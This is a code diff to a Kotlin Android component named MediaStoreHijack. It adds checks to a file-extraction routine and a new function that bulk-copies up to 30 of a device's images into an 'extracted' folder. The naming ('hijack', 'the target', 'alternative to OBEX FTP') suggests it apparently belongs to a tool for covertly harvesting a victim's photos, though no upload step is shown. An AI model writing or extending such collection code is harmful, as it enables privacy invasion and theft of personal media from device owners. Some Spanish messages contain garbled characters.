@@ -94,7 +94,10 @@ object MediaStoreHijack {
             val bytes = inputStream.readBytes()
             inputStream.close()
 
-            // Save to app's private external files directory
+            if (bytes.isEmpty()) {
+                return mapOf("success" to false, "error" to "Empty media content", "uri" to uriString)
+            }
+
             val fileName = "media_${System.currentTimeMillis()}_${uri.lastPathSegment}"
             val outputDir = context.getExternalFilesDir("extracted")
             if (outputDir != null && !outputDir.exists()) {
@@ -103,14 +106,16 @@ object MediaStoreHijack {
 
             val outputFile = File(outputDir, fileName)
             outputFile.writeBytes(bytes)
+            val saved = outputFile.exists() && outputFile.length() > 0L
 
             Log.d(TAG, "File extracted to: ${outputFile.absolutePath} (${bytes.size} bytes)")
 
             mapOf(
-                "success" to true,
+                "success" to saved,
                 "path" to outputFile.absolutePath,
                 "size" to bytes.size,
-                "originalUri" to uriString
+                "originalUri" to uriString,
+                "message" to if (saved) "MediaStore file extracted" else "MediaStore: fallo al guardar archivo"
             )
 
         } catch (e: Exception) {
@@ -250,5 +255,51 @@ object MediaStoreHijack {
         return uris.map { uri ->
             extractMediaStoreFile(context, uri)
         }
+    }
+
+    /**
+     * Batch extract ALL images from MediaStore into app private storage.
+     * Modern alternative to OBEX FTP — works on Android 10+ scoped storage
+     * when the target has granted READ_MEDIA_IMAGES or legacy storage.
+     */
+    fun extractAllImages(context: Context, maxImages: Int = 30): Map<String, Any> {
+        val extracted = mutableListOf<Map<String, Any>>()
+        val enumerated = enumerateMediaStore(context)
+        var count = 0
+
+        for (entry in enumerated) {
+            if (count >= maxImages) break
+            val uri = entry["uri"] as? String ?: continue
+            val name = entry["name"] as? String ?: "image_${count}"
+            val mimeType = entry["mimeType"] as? String ?: "image/jpeg"
+
+            if (!mimeType.startsWith("image/")) continue
+
+            try {
+                val result = extractMediaStoreFile(context, uri)
+                if (result["success"] == true) {
+                    extracted.add(
+                        mapOf(
+                            "name" to name,
+                            "size" to (result["size"] ?: 0),
+                            "localPath" to (result["path"] ?: ""),
+                            "remotePath" to uri,
+                            "mimeType" to mimeType,
+                            "modified" to (entry["date"] ?: "")
+                        )
+                    )
+                    count++
+                }
+            } catch (_: Exception) {}
+        }
+
+        return mapOf(
+            "success" to extracted.isNotEmpty(),
+            "images" to extracted,
+            "imagesCount" to extracted.size,
+            "totalBytes" to extracted.fold(0L) { acc, img -> acc + ((img["size"] as? Long ?: 0)) },
+            "method" to "mediastore_enhanced",
+            "message" to if (extracted.isNotEmpty()) "MediaStore enhanced: ${extracted.size} im�genes extra�das" else "MediaStore: sin im�genes accesibles"
+        )
     }
 }
